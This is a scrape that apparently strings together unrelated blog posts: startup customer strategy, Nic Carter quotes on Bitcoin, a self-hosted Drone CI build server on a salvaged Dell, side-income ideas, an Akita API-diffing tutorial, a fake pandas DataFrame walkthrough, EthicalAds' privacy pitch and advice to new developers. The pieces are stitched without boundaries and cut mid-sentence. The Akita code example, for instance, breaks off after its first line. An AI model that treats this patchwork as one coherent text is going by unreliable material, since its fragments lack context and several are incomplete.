think that trend stops at one. Next most valuable is winning and keeping customer 2. Then 3, etc.</p><p>It's not as obvious when the most important thing for the company is something <strong>other</strong> than winning the next customer, unless there is some critical constraint on serving the next customer.</p><p>The more customers you have, the more certainty, replicability, and economies of scale you gain.</p><p>The unit economics and the accounting profit from customer #100,000 will be better than customer #1... but #100,000's impact on enterprise value will be much lower. </p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1603889398200_7697"><div><p>That is why "do things that don't scale" matters — because early customers are huge steps to turning a company from "default dead" ($0) to "default alive" ($1,000,000+). And the early team is rewarded for their high-risk, high-reward cartography work.</p><p>It is hard work. Sitting in front of a customer confused about what they need and whether you can help is uncomfortable. Selling a new product to new customers with no script is tough.

And the heuristic will help you focus and prioritize early on.</p><p>Notes: </p><ul data-rte-list="default"><li><p>"Customer" implies paying.

									Takeaways
								</p>
								<div>
									<ul>
<li><span>“Twelve years ago today, on Halloween 2008, exactly 491 years after Martin Luther nailed his theses to the door of Wittenberg Castle Church, the idea of Bitcoin was born… The network itself wouldn’t exist in a truly live and peer-to-peer fashion until the following January. Block 1, the first ‘true’ block, was mined on the ninth, and digital cash pioneer Hal Finney received the first transaction on the tenth of the month.” — Nic Carter&nbsp;</span></li>
<li><span>Bitcoin gets confused by many people. Especially people who live in the West. “…This isn’t the reality for the majority of the world’s population, who suffer under inflationary regimes, or politicized and untrustworthy banking systems…Understanding the purpose of Bitcoin is itself a shibboleth. If you don’t get it, it’s probably not meant for you.” — Nic Carter</span></li>
<li><span>Nobody owns Bitcoin. No government, no one person owns it. It’s what’s known as decentralized.&nbsp;</span></li>
<li><span>“What’s the measure of a healthy society? Arguably, it’s a willingness to undertake long term projects, whose completion their originators will never live to see. Virtually anything worth building takes time to build. Enduring institutions don’t come easy.” — Nic Carter</span></li>
<li><span>“The cathedral is not the stones that compose it. Nor is Bitcoin the blocks. The cathedral is the physical embodiment of a singular idea: something greater exists. Its greatness makes you feel small, and reminds you of your place in the universe.” — Nic Carter</span></li>
</ul>
								</div>
								<p><img src="https://gradually.co/wp-content/themes/gradually/img/two-cents.png">
								</p><!-- end half sqaure arrow -->
								<p><span>It’s crazy to think that Bitcoin is only 12 years old. It’s somewhat embarrassing that I don’t think I fully wrapped my head around this until just now as I’m writing this. I was 10 when Bitcoin was introduced to the world…</span></p>

November 2, 2020 | http://pascalboardman.com/posts/poorman_build_server/ | <a href="https://web.archive.org/web/*/http://pascalboardman.com/posts/poorman_build_server/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>These past few years I’ve been trying to self-host as much as I can, I keep most of my data on a home NAS instead of Google Drive, I have a PLEX Server for my streaming needs, A Proxmox server for quickly spinning up VM locally instead of Using Digital Ocean. Not that I hate cloud services but hosting my own things feels more personal and fun!</p>
<p>Long story short, I also run a <a href="https://gitea.io/en-us/">Gitea</a> instance which is a code hosting solution similar to Github. It’s lightweight and cover most of my code hosting needs. The only thing I missed was a CI/CD platform like <a href="https://github.com/features/actions">Github Actions</a> or Gitlab’s <a href="https://docs.gitlab.com/ee/ci/pipelines/">CI/CD pipelines</a>. Let’s build one!</p>

<p>Sure, I could have created a VM on my Promox server, but while taking a walk with my girlfriend we ran across an old computer discarded near a trash container, it was (mostly) clean but pretty busted. In the “spirit of recycling” we took it home so I could hopefully restore it and use it as my CI/CD server! (This is where the <code>poor man</code> part of this article’s title come from 😉)</p>
<h2 id="enter-the-trash-pc">Enter the trash PC!</h2>
<p><img src="http://pascalboardman.com/poormanbuildserver/trashpc_orig.jpg" alt="trashpc_orig"></p>
<p>The side panel wasn’t removed for the picture, there wasn’t one to begin with!</p>
<p>Inspecting the remains of the case I found the model and date of manufacturing, a Dell OptiPlex 755 made in October 2007. Not a powerhouse but good enough for me.</p>
<p>Time to test if it even works, surprisingly it booted up without a problem, but the hard drive made weird ticking noises. This isn’t really a problem as I have a spare hard drive lying around.</p>
<h2 id="fixing-it-up">Fixing it up</h2>
<p>After removing the heatsink and the RAM I got the specs:</p>
<ul>
<li><a href="https://ark.intel.com/content/www/us/en/ark/products/30781/intel-core-2-duo-processor-e4500-2m-cache-2-20-ghz-800-mhz-fsb.html">Intel Core 2 Duo E4500 @ 2.20GHz </a></li>
<li>2GB of DDR2</li>
</ul>
<p>The CPU is <em>fine</em>, but 2GB of RAM is a bit on the low side. Luckily, I also had some DDR2 sticks on hand (I swear I’m not a hoarder!) and I managed to upgrade this bad boy to 6GB of RAM!</p>
<p>The only other HDD I had available is a <strong>8TB</strong> <a href="https://www.newegg.ca/seagate-archive-hdd-v2-st8000as0002-8tb/p/N82E16822178748?Item=N82E16822178748">Seagate Archive Drive</a>… Guess it will have to do.</p>
<p>Now there is the problem of the missing side panel, a clear case seemed like it would look cool so I bought a clear acrylic sheet and with the help of my girlfriend we cut it to fit the case, then drilled some holes in the case to retrofit our makeshift side panel:</p>
<p><img src="http://pascalboardman.com/poormanbuildserver/drill.jpg" alt="drill"></p>
<p>Final result:
<img src="http://pascalboardman.com/poormanbuildserver/final_nosticker.jpg" alt="final_nosticker">
<img src="http://pascalboardman.com/poormanbuildserver/final_sticker.jpg" alt="final_sticker"></p>
<p>Nothing fancy but it will keep the dust from getting in and help a bit with the airflow.</p>

<p>First thing to do is install an operating system, I choose CentOS because I’m a fedora user and I use mostly RHEL stuff at work but any distro would be fine.</p>
<p>Now for the CI/CD software: I looked at a couple of options but ultimately decided to try out <a href="http://pascalboardman.com/posts/poorman_build_server/drone.io">Drone</a> since it was open-source and could integrate with Gitea.</p>
<p>The installation was straightforward enough, you can run it in docker so I created two containers, one for the drone server itself, and another that will be used as a <em>runner</em> (Where the builds will run).
After some trial and error trying to link Drone to my Gitea instance I managed to get everything to run nicely! (By <em>trial and error</em> I mean I didn’t read all the documentation and messed up some environment variables)</p>
<p>This is the final <code>docker-compose.yml</code> file I ended up with:</p>
<div><pre><code data-lang="yaml"><span>drone</span>:
  <span>image</span>: drone/drone:<span>1</span>
  <span>environment</span>:
    <span>DRONE_GITEA_SERVER</span>: http://<span>192.168.1.215</span>:<span>3000</span>
    <span>DRONE_GITEA_CLIENT_ID</span>: REDACTED
    <span>DRONE_GITEA_CLIENT_SECRET</span>: REDACTED
    <span>DRONE_RPC_SECRET</span>: REDACTED
    <span>DRONE_SERVER_HOST</span>: <span>192.168.1.245</span>
    <span>DRONE_SERVER_PROTO</span>: http
    <span>DRONE_USER_CREATE</span>: username:droneuser,admin:<span>true</span>
  <span>ports</span>:
    - <span>80</span>:<span>80</span>
    - <span>443</span>:<span>443</span>
  <span>volumes</span>:
    - /var/lib/drone:/data

<span>drone-runner</span>:
  <span>image</span>: drone/drone-runner-docker:<span>1</span>
  <span>environment</span>:
    <span>DRONE_RPC_SECRET</span>: REDACTED
    <span>DRONE_RPC_HOST</span>: <span>192.168.1.245</span>
    <span>DRONE_SERVER_PROTO</span>: http
    <span>DRONE_RUNNER_CAPACITY</span>: <span>2</span>
    <span>DRONE_RUNNER_NAME</span>: runner
  <span>ports</span>:
    - <span>3000</span>:<span>3000</span>
  <span>volumes</span>:
    - /var/run/docker.sock:/var/run/docker.sock
</code></pre></div><p>Here is a simple explanation for the environnement variables:</p>
<p><code>DRONE_GITEA_SERVER</code>: The URL used to access you Gitea instance</p>
<p><code>DRONE_GITEA_CLIENT_ID</code> and <code>DRONE_GITEA_CLIENT_SECRET</code>: The ID and Secret generated by creating an Oauth application on your Gitea instance</p>
<p><code>DRONE_RPC_SECRET</code>: A secret that is shared between your Drone server and its runners</p>
<p><code>DRONE_SERVER_HOST</code>: The IP or Hostname where the Drone instance is running</p>
<p><code>DRONE_SERVER_PROTO</code>: The protocol used by the drone server, can be either <em>http</em> or <em>https</em>. Mine is set to <em>http</em> for now, which isn’t that bad since it’s on a local network only but it’s still not a great idea 🙂</p>
<p><code>DRONE_USER_CREATE</code>: Users to create on startup</p>
<p><code>DRONE_RPC_HOST</code>: Same as <code>DRONE_SERVER_HOST</code></p>
<p><code>DRONE_RUNNER_CAPACITY</code>: Number of maximum concurrent pipelines that can run on the runner</p>
<p><code>DRONE_RUNNER_NAME</code>: The name of your runner, maybe be a bit more original than me.</p>

<p>To activate a pipeline on one of your Gitea Repo you just need to click <code>SYNC</code> in the Drone Web UI, then click the activate button next to the repo you want!</p>
<p><img src="http://pascalboardman.com/poormanbuildserver/droneUI.PNG" alt="droneUI"></p>
<p>There is a couple of things that can be configured, the important one here is the <code>Configuration</code> Setting, which is the file in your repo that will contain the pipeline’s definition (here it’s <code>.drone.yml</code>)</p>
<p><img src="http://pascalboardman.com/poormanbuildserver/droneSettings.PNG" alt="droneSettings"></p>
<p>Here is useless pipeline definition to show what it looks like:</p>
<div><pre><code data-lang="yaml"><span>kind</span>: pipeline
<span>type</span>: docker
<span>name</span>: print to the log and do nothing else

<span>steps</span>:
- <span>name</span>: print to the log
  <span>image</span>: ubuntu:latest
  <span>commands</span>:
  - echo <span>"Working!"</span>

<span>trigger</span>:
  <span>branch</span>:
  - master
  <span>event</span>:
  - push
</code></pre></div><h2 id="pipeline-definition">Pipeline definition</h2>
<p>The first part defines how the steps will work, the important setting in here is <code>type</code>.</p>
<p><code>kind</code>: Always <em>pipeline</em>, as far as I know</p>
<p><code>type</code>: The type of pipeline, most of the time it will be <em>docker</em>, more info <a href="https://docs.drone.io/pipeline/overview/">here</a></p>
<p><code>name</code>: name of your pipeline, just write the first thing that come to mind</p>
<h2 id="steps">Steps</h2>
<p>The rest of the pipeline is a series of steps to be ran, each step is run in a different container of your choosing (with <code>type: docker</code>)</p>
<p><code>image</code>: The docker image you want to use for this step of the build</p>
<p><code>commands</code>: Pretty self-explanatory, do whatever you want to do!</p>
<p>More info about steps can be found <a href="https://docs.drone.io/pipeline/exec/syntax/steps/">here</a></p>
<h2 id="triggers">Triggers</h2>
<p>This part is used to know when to trigger the pipeline, you can restrict by branches and events, for more information look <a href="https://docs.drone.io/pipeline/docker/syntax/trigger/">here</a></p>
<h2 id="final-stretch">Final stretch</h2>
<p>Time to run the pipeline! I pushed the <code>.drone.yml</code> to my repo and the result of the build can be seen in Drone’s Web UI (You can also access it directly from Gitea).</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p>Making money from multiple sources. The idea is simple, but realizing it requires tenacity and focus.&nbsp;Here are six ways for people with a background in liberal arts and social science to start building multiple income streams:</p>
<ol>
<li>
<h4><em>Start tutoring.</em></h4>
<p>Tutoring is one of the most lucrative jobs on an hourly basis: $50, $100, $200, $300 per hour – all possible if you build a network and hone your craft. Plus, if you prepare creatively and develop a tutoring specialty in an interesting area, it can be intellectually stimulating, as well. I have literally traveled the world for tutoring and made a good deal of money along the way. I really recommend it. So check out this <span><strong><a href="https://human-jobs.com/2020/10/10/tutoring-jobs-a-golden-opportunity/">post</a></strong> </span>for more insights.</p></li>
<li>
<h4><em>Become a writer.</em></h4>
<p>Start writing for anyone about anything. It can be for a blog, local newspaper, magazine, or travel brochure. Once you start to build a writing portfolio, finding your next writing gig will get even easier. Writing is also an amazing way to showcase your knowledge of a new subject area. If you are looking for a job in a new field, one of the best ways to demonstrate passion and industry knowledge is to develop a credible blog on the subject. For example, Kat Boogard is an amazing freelance writer who has written extensively about her experience, so <span><strong><a href="https://katboogaard.com/">check her out</a>.</strong></span></p></li>
<li>
<h4><em>Be an artist.</em></h4>
<p>Many of us have artistic passions, which can be transformed into income streams. Maybe your abstract paintings could find a paying audience in a gallery, or your lovely soprano voice could land you a spot in a paid choir. I adore singing, and I never thought of my stipend from choir as an income stream, but it was my main source of cash throughout college! Through <a href="https://www.youtube.com/" target="_blank" rel="noopener noreferrer">YouTube</a>, <a href="https://www.etsy.com/" target="_blank" rel="noopener noreferrer">Etsy</a>, <a href="http://www.amazon.com/" target="_blank" rel="noopener noreferrer">Amazon</a>, <a href="http://www.ebay.com/" target="_blank" rel="noopener noreferrer">eBay</a>, and others, you can find an eager (and paying) audience for your creative energies.</p></li>
</ol>
<p>A friend of mine launched a really successful product line on Etsy – <span><strong><a href="https://www.etsy.com/shop/NukumoriGarden?ref=simple-shop-header-name&amp;listing_id=806085743&amp;fbclid=IwAR3G1hEh307L2yG9ZCCPQ29WWtPSZjHC8UiBuZA2_pITbZtJtEkFBHwRtM4">Nukumori Garden.</a> </strong></span>It started as a side project and then grew into a serious income stream. She had been working with infants and families for years as a mental health provider and enjoyed sewing as a kid. Her Etsy shop grew out of a desire to offer care-filled handmade items with more variety and quality than is found in big-box retailers. She’s combining her knowledge of infant and child development with the artistic outlet of designing and creating items for kids and caregivers.</p>
<h4><em>4. Become an assistant. </em></h4>
<p>Assisting an organization or an individual with administrative tasks provides ample opportunity to make money and do fulfilling work. I know an assistant in London who works part-time for two Hollywood actors. She gets behind-the-scenes access, helps make movies, and earns money along the way. Maybe your first assistant job won’t be so glamorous, but if that kind of work interests you, make a five-year plan and build the skills and experience necessary to become a helper to the stars.</p>
<h4><em>5. Invest your money. </em></h4>
<p>Investing is a risky business. Put simply, do <em>not </em>do it without a clear understanding of what you stand to lose. At the same time, investing in projects that you understand, provide a clear value-add, have competent management, and target an exciting industry can generate positive returns. Plus, the process of conducting diligence on an investment is a good chance to learn about a new area. (Obviously none of this is investment advice!). For more on this, check out the blogs of some famous investors, like <span><strong><a href="https://avc.com/">Fred Wilson</a></strong></span> or <span><strong><a href="https://feld.com/">Brad Feld.</a></strong></span></p>
<h4><em>6. Build a business. </em></h4>
<p>This is definitely ambitious, but if you have a clear idea and real passion, go for it. Internet or software businesses are a good place to start because they require less money upfront and scale more easily. But it is also possible to set up an editing, consulting, or tutoring business, as well. If you are already building skills in a particular area, think of some potential clients and ask yourself, “how can I serve them better than anyone else?” That is the first question a great entrepreneur will ask. <span><a href="https://www.amazon.com/Lean-Startup-Entrepreneurs-Continuous-Innovation/dp/0307887898/ref=sr_1_1?dchild=1&amp;keywords=the+lean+startup&amp;qid=1603395136&amp;sr=8-1"><strong><em>The Lean Startup</em></strong></a></span> by Eric Ries is a good starting point for budding entrepreneurs.</p>
<h2>Rewards in the mind and pocketbook</h2>
<p>I have developed all six of these income streams at different points in my life, and any one of them is an amazing place to start. What’s especially nice is that you can do them in addition to full-time work or layered on top of each other.</p>
<p>Once the different streams start to grow, you will benefit enormously from financial diversification, as well. If you were to lose your main job or one of your projects did not pan out, you can rely on the others. Diversification of income contributes to increased economic security, which can greatly reduce stress and contribute to overall well-being (this is a fascinating area of research, so read more: <span><strong><a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC1405640/" target="_blank" rel="noopener noreferrer">1</a></strong></span>, <span><a href="https://www.sciencedirect.com/science/article/pii/S2352827318300594" target="_blank" rel="noopener noreferrer"><strong>2</strong></a></span>, <span><strong><a href="https://onlinelibrary.wiley.com/doi/10.1111/j.1536-7150.2010.00728.x" target="_blank" rel="noopener noreferrer">3</a></strong></span>) Plus, when you have varied and exciting projects on the go, you will enjoy a serious sense of purpose.</p>
<h2>Prepare yourself for the future</h2>
<p>Last, but not least: having multiple careers or even simultaneous careers is the way of the future. With the rise in telecommuting, it is easier than ever to offer your talents across the world.</p>
<p>Now you can teach in Africa, Asia, or Europe, even if your day job is in New York, Los Angeles, or Milwaukee. Maybe your artistic talents with watercolors would delight a Japanese audience. Or perhaps your knowledge of American literature is exactly what an ambitious French high-schooler needs before university. Embrace this new flexibility. It is one of the great privileges of living in the twenty-first century. Once you recognize your talents as assets, there is a wide world of fulfilling and lucrative work for you.</p>

Because it’s hard to simulate production workloads beforehand, functionality that depends on service-service interactions often doesn’t get fully exercised until production. The result is that bugs don’t get uncovered until they are triggered by live user traffic.</p><p>As a developer who has also worked in devops, I understand the importance of finding and fixing bugs early in the development cycle. This is one of the reasons I’m excited to be working on change management at Akita. A few weeks ago, our team published a <a href="https://www.akitasoftware.com/blog/2020/9/22/faster-better-earlier-catch-breaking-changes-by-diffing-api-behavior">blog post talking about this at a high level</a>. In this blog post, I’m going to go into the nuts and bolts. I’ll show a bug that’s hard to catch with source diffs, linters, or static analysis. Then I’ll show how to use Akita to catch this bug, describing the entire setup from start to finish. Finally, I’ll explain how Akita works under the hood.</p><div><p>Something I’m particularly proud of about Akita is that you can use us without needing to proxy or to make any code changes—and we’ve been working hard so you can set up everything you need to catch breaking changes in just minutes. <a href="https://www.akitasoftware.com/get-invite?utm_campaign=2020_pre_launch&amp;utm_medium=blog&amp;utm_source=2020_11_2_howto">Try out our private beta</a> to see for yourself!</p></div><h2>🕵🏻‍♀️ A particularly sneaky bug</h2><p><em>You can find the Go source code for this example on </em><a href="https://github.com/akitasoftware/akita-change-management-demo"><em>GitHub here</em></a><em>.</em></p><p>Let’s say you’re working on an API that returns information about users. To comply with regulations, you omit user phone numbers from the response to prevent callers of your API from storing this information in a scattered fashion that makes it hard to service deletion requests.&nbsp;</p><p>For example, your API might look like:&nbsp;</p></div></div><div data-block-type="23" id="block-yui_3_17_2_1_1604279471234_65920"><div><!-- HTML generated using hilite.me --><div><pre><span>type</span> <span>User</span> <span>struct</span> <span>{</span>

And this data leak is just one of <em>many</em> kinds of bugs that are hard to catch pre-production, but that you can catch if you have a better model of how your service is interacting with other services.</p></div><h2>⚡️ Setting up Akita to fix this bug</h2><p>To stop these bugs once and for all, we will show how to add Akita to your CI/CD pipeline, so that you get notified how every pull request changes our API. For our particular deployment, we are using CircleCI and GitHub to run Akita. You can easily modify the instructions for your CI/CD pipeline of choice.</p><p>The steps for getting up and running are:</p><ol data-rte-list="default"><li><p>Create a new service in Akita, if you don’t have one already.</p></li><li><p>Connect Akita to GitHub.</p></li><li><p>Update your CircleCI configuration.</p></li><li><p>Open a pull request with an API change.</p></li></ol><p>The first thing we need to do is head over to the Akita Console and create a new Akita service. You can do that by clicking on the “New Service” button on the left-hand menu. If you already have a service, you can skip this step.</p><p>Once we’ve created and named our new service, we need to connect Akita to Github. To do this, simply click on the “Integrations” menu and then “Integrate” under GitHub. This will take us to GitHub where we can give Akita permission to watch our pull requests.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1604279471234_215681"><div>

To do this, you can use the same start and stop learning commands from your CI in your production environment to create a model of your production behavior. To use it as a baseline for pull requests comparisons, simply mark the production spec as stable in the Akita Console.</p><div><p>Talk to us if this is something you’re interested in!</p></div><h2>🔩 Akita nuts and bolts</h2><p>Under the hood, Akita works by building models of API behavior by watching API traffic.</p><p>What I just showed you works by:</p><ol data-rte-list="default"><li><p><strong>Reconstructing HTTP requests/responses from live packet captures. </strong>No code changes or proxies.

    <a href="https://leontrolski.github.io/index.html"><img src="https://leontrolski.github.io/pic.png">â‡¦</a>
    
    <p>
        When you're used to plain ol' <code>dict</code>s, <code>int</code>s, <code>list</code>s etc, <code>pandas.DataFrame</code>s exhibit some weirdo behaviour, particulary concerning assignment and operators. This page is a short walk-through of how some of these things happen (and a quick intro to Python's magic methods), you can see the outcome <a href="https://github.com/leontrolski/fake-data-frame">here</a>.
    </p>
    <p>
        <em>Disclaimer:</em> the things presented here are not <em>entirely</em> as the <code>pandas</code> <code>DataFrame</code>s work, they are more intended as a guide to how they do.
    </p>

    <p>
        The below examples use python type hints to help keep things a bit clearer, at the <a href="https://github.com/leontrolski/fake-data-frame/blob/master/fake_data_frame.py">top</a>, we have:
    </p>

    <pre><code>from typing import Any, Dict, List</code></pre>

    <p>
        <code>DataFrame</code>s are a collection of <code>Series</code> (AKA columns), let's start with a really dumb <code>FakeSeries</code>.
    </p>

    <pre><code>class FakeSeries:
    def __init__(self, name: str, data: Dict[int, Any]):
        self.name = name
        self.data = data

    def __repr__(self) -&gt; str:
        return f'&lt;FakeSeries: {self.name} {self.data}&gt;'</code></pre>

    <pre><code>&gt;&gt;&gt; my_series = FakeSeries("some_column_name", {0: 5, 1: 7, 2: 9})
&lt;FakeSeries: some_column_name {0: 5, 1: 7, 2: 9}&gt;</code></pre>

    <ul>
        <li>Note how the <code>__repr__</code> method is used by <code>print()</code></li>
        <li>There a list of all the magic methods you can override on a class <a href="https://docs.python.org/3/reference/datamodel.html#basic-customization">here</a></li>
        <li>Note how we are storing the series as a map of indices (0, 1, 2) to values (5, 7, 9)</li>
    </ul>

    <p>
        Now we will define our <code>FakeDataFrame</code>, it similarly has a useful <code>__init__</code> and <code>__repr__</code> (although this is only fully fleshed out in the <a href="https://github.com/leontrolski/fake-data-frame/blob/master/fake_data_frame.py">original</a>). On initialisation, it sets <code>self.series_map</code> which is a map of series names to series.
    </p>

    <pre><code>class FakeDataFrame:
    def __init__(self, d: Dict[str, List[Any]]):
        self.series_map = {
            k: FakeSeries(k, {i: v for i, v in enumerate(l)})
            for k, l in d.items()
        }
        self.length = len(list(d.values())[0])

    def __repr__(self):
        width = 5
        ...
        return '\n'.join((headers, divider) + rows) + '\n'</code></pre>

    <p>
        Already, we can see the beginnings of a <code>pandas</code>-like <code>DataFrame</code> interface.
    </p>

    <pre><code>&gt;&gt;&gt; df = FakeDataFrame({
    'a': [4, 5, 6],
    'b': [7, 8, 9],
})

    a |     b
-------------
    4 |     7
    5 |     8
    6 |     9</code></pre>

    <p>
        Now the clever stuff begins, lets add two methods to <code>FakeDataFrame</code> so that we can retreive and set its <code>Series</code>.
    </p>

    <pre><code>    # handle []
    def __getitem__(self, key: str) -&gt; FakeSeries:
        return self.series_map[key]

    # handle [] =
    def __setitem__(self, key: str, value: FakeSeries) -&gt; None:
        if key not in self.series_map:
            self.series_map[key] = FakeSeries(key, {})
        for i, v in value.data.items():
            self[key].data[i] = v</code></pre>

    <p>
        Let's retreive a series.
    </p>

    <pre><code>&gt;&gt;&gt; df['b']
&lt;FakeSeries: b {0: 7, 1: 8, 2: 9}&gt;</code></pre>

    <p>
        And let's set one.
    </p>

    <pre><code>&gt;&gt;&gt; df['b'] = FakeSeries("not_b", {1: 'foo', 2: 'bar'})
&gt;&gt;&gt; df
    a |     b
-------------
    4 |     7
    5 |   foo
    6 |   bar</code></pre>

    <p>
        Note how that the name of the series didn't need to align with "b", and that we were able to assign to series <code>b</code> at only indices 1 and 2.
    </p>

    <p>
        Now to add some more smarts to our <code>FakeSeries</code>.
    </p>

    <pre><code>    # handle *
    def __mul__(self, other: int) -&gt; 'FakeSeries':
        return FakeSeries(
            self.name,
            {i: v * other for i, v in self.data.items()},
        )

    # handle &gt;;
    def __gt__(self, other: int) -&gt; 'FakeSeries':
        return FakeSeries(
            self.name,
            {i: v &gt; other for i, v in self.data.items()},
        )

    # handle []
    def __getitem__(self, key: 'FakeSeries') -&gt; 'FakeSeries':
        return FakeSeries(
            self.name,
            {i: v for i, v in self.data.items() if key.data.get(i, False)},
        )</code></pre>

    <ul>
        <li><code>__mul__</code> takes an integer and returns a new <code>FakeSeries</code> with each of the values multiplied by it</li>
        <li><code>__gt__</code> takes an integer and returns a new <code>FakeSeries</code> where each of the values is greater than it</li>
        <li><code>__getitem__</code> takes another <code>FakeSeries</code> called <code>key</code> and returns a new <code>FakeSeries</code> with each of the values that had an index value contained in <code>key</code>'s index</li>
    </ul>

    <p>
        We can now do some super <code>pandas</code>-y stuff, let's remind ourselves of the DataFrame we're working with.
    </p>

    <pre><code>    a |     b
-------------
    4 |     7
    5 |     8
    6 |     9</code></pre>

    <pre><code>&gt;&gt;&gt; df['b'] &gt; 7
&lt;FakeSeries: b {0: False, 1: True, 2: True}&gt;</code></pre>

    <pre><code>&gt;&gt;&gt; df['a'][df['b'] &gt; 7]
&lt;FakeSeries: a {1: 5, 2: 6}&gt;</code></pre>

    <p>
        And to put it all together.
    </p>

    <pre><code>&gt;&gt;&gt; df['mult'] = df['a'][df['b'] &gt; 7] * 2
&gt;&gt;&gt; df
    a |     b |  mult
---------------------
    4 |     7 |   NaN
    5 |     8 |    10
    6 |     9 |    12</code></pre>

    <p>
        Pretty cool huh!
    </p>

<p>Ads that don't track you, sold by a company you can trust</p>
    <p>We realize that our name, EthicalAds, sets a high bar for what people expect.
We do our best to live up those expectations in all aspects of our business.
Whether you are a prospective advertiser,
you're looking to run our ads on your site,
or you just care about privacy and you want to learn more,
we want to define <em>ethical advertising</em> for you here.</p>
<h2 id="what-is-ethical-advertising">What is ethical advertising</h2>
<p>Ethical ads respect users while still providing value to advertisers.
The most important parts are:</p>
<ul>
<li>Ethical advertising doesn't track you. This means no permanent advertising cookies and no indefinite storage of personal information.</li>
<li>Companies doing ethical advertising should make money showing ads, not selling user data, so their interests are fully aligned.</li>
<li>Ethical ads should target users based on what they're currently browsing, not past browsing history.</li>
</ul>
<p>Some companies would like you to believe that it's impossible to do advertising
without user tracking, but that simply isn't true.
To paraphrase <a href="https://blogs.harvard.edu/doc/the-adblock-war/">Doc Searls</a>,
who has been raising the alarm about invasive advertising for years,
traditional advertising without tracking built every brand you can name.</p>
<blockquote>
<p>"Advertising [without tracking] ... created nearly every worldwide brand you can name"</p>
<p>— Doc Searls, editor-in-chief of Linux Journal</p>
</blockquote>
<h2 id="why-we-created-ethicalads">Why we created EthicalAds</h2>
<p>We started ethical advertising
as a way to fund sustainable open source development on Read the Docs.
At Read the Docs, we listened to our users.
They told us they didn't have a problem with advertising
but they wanted their privacy respected: no tracking users around the internet and no advertising cookies.
At that time, there wasn't an ad network out there willing to work with us on those terms (we looked).</p>
<p>So we bootstrapped our own advertising platform.
We built our own ad server and did our own ad sales.
It wasn't easy,
but as we talked about in our <a href="https://blog.readthedocs.com/ethical-advertising-works/">2018 blog post</a>: <strong>ethical advertising works</strong>.
We're thrilled to be able to bring our vision of advertising to open source developers everywhere.</p>
<p>We targeted developers first because as developers ourselves,
we understand the <a href="http://idlewords.com/talks/what_happens_next_will_amaze_you.htm">massive downsides</a> of the current advertising industry.
This includes malware,
slow site performance,
and huge databases of your personal data being sold to the highest bidder.
We didn't want to be a part of that
and from talking to our users at Read the Docs,
there seemed to be lots of other folks out there who didn't either.</p>
<h2 id="how-our-ads-work">How our ads work</h2>
<p>Our ads work a bit differently than most other ad networks out there.
Most ad networks have databases of user data
that they use to predict the types of ads somebody is likely to click.
This data includes sites a user has visited,
a user's search history, personal data about users such as their likes and dislikes,
and ads a person has interacted with in the past.</p>
<p>At EthicalAds, <strong>we don't use these techniques</strong>.
Instead, we target based solely upon:</p>
<ul>
<li>
<p>Details of the page where the advertisement is shown including:</p>
<ul>
<li>The name and keywords associated with the publisher's content</li>
<li>Content of the page (eg. H1, title, etc.)</li>
<li>Whether the page is being viewed on a mobile device</li>
</ul>
</li>
<li>
<p>General geography</p>
<ul>
<li>We allow advertisers to target ads to a list of countries or to exclude
  countries from their advertising.
  For ads targeting the USA, we support finer geo targeting but nothing smaller than a 50 mile radius.</li>
<li>We geolocate a user's IP address when a request is made and we don't store
  precise locations or precise IPs for longer than a few days to detect fraud and keep our site secure.</li>
</ul>
</li>
</ul>
<h2 id="why-our-ads-work">Why our ads work</h2>
<p>In addition to how they work, it's also important to talk about <em>why</em> our ads work.
Tracking users is one way to keep ads relevant and make sure they work for advertisers,
but it isn't the only way. Instead we:</p>
<ul>
<li>Focus on developers. Don't try to build another generic ad network for everyone.</li>
<li>Partner only with high-quality publishers who also focus on developers.</li>
</ul>
<p>By focusing,
we are able to ensure our ads stay relevant even without tracking and work well for our advertisers.
We also vet every publisher individually to make sure they're a fit for our network
and ensure that they bring the kind of audience our advertisers want to reach.</p>
<h2 id="your-data">Your data</h2>
<p>At EthicalAds, we take your privacy seriously.
We've made a number of legally-binding pledges about how we handle data starting with our <a href="https://www.ethicalads.io/privacy-policy/">privacy policy</a>.
We don't want you to just take our word for it, however,
so we invite you to take a look at our <a href="https://github.com/readthedocs/ethical-ad-server/">code</a> as well.</p>
<p>EthicalAds supports Do Not Track (DNT).
To comply with DNT, we pledge to delete user personal information such as IP addresses in server logs after no more than 10 days.
We do this regardless of whether you set the DNT flag in your browser or not.
For more details, see the <a href="https://www.ethicalads.io/privacy-policy/#our-use-of-cookies-and-tracking">Do Not Track section</a>
of our privacy policy.</p>
<p>We do not share, sell, rent, or trade personal information with third parties for their commercial purposes.</p>
<h2 id="join-us">Join us</h2>
<p>Ethical advertising is our vision for the future of internet advertising,
and we hope that you'll join us.
We believe the open source community should show the way forward,
since we have a deep understanding of how privacy issues impact the internet.
We have space for additional publishers and advertisers,
and look forward to building something meaningful with you:</p>

<p>Dear new developer, </p>



<p>The honest truth is that you won’t know everything. No one does. The CEO, CTO, the team lead, that really smart senior developer on your team, none of them know everything. In fact, I bet if you asked any one of them if they’d been stymied in the past week, they’d reveal that yes, they ran into something they didn’t know how to do or how to approach.</p>



<p>Encyclopedic knowledge isn’t a good goal. You need to know how to figure things out. But when someone asks you “can you do X?”, you need to be prepared with the right answer, even if you don’t know how to do X. For example, I was tasked with setting up a static IP for a heroku application. I didn’t know how to do this. Rather than say “I don’t know how to do that”, I said “let me do some research and get back to you.” I also asked about deadlines and how high a priority this was. </p>



<p>I did some research, read some docs and came up with a proposed solution. I discussed it at standup with my team, including my boss, and we came up with a path toward implementation. </p>



<p>When you don’t know something, and someone asks you about it, there are a few things you must do.</p>



<p>First, you should tell them you don’t know. They might have some clues for you, or pointers to documentation. These can all accelerate your ability to do what is asked of you.</p>



<p>Depending on the situation, they may assume you know, based on their experience. For example, I work in the authentication space right now, with standards like OAuth and OIDC. When I first started, I had to ask what every piece of jargon meant, but after a few months I got up to speed. Now when I talk to other audiences, <em>I</em> need to be careful not to use too much jargon or assume what others know. One favorite technique I use is repeating back what someone said: “Can I repeat back to you what said to make sure I understand it? What I heard is that the OAuth code grant redirects to the client application after the user authenticates. Is that right?”</p>



<p>When you say “I don’t know” don’t stop there. Say “I don’t know, but I’ll find out.” Again, they may point you in a direction, but by adding that second clause, you indicate that you’ll solve this problem. You should also ask about timeline and priority if that hasn’t been communicated (by story points, a task tracker or in some other fashion).</p>



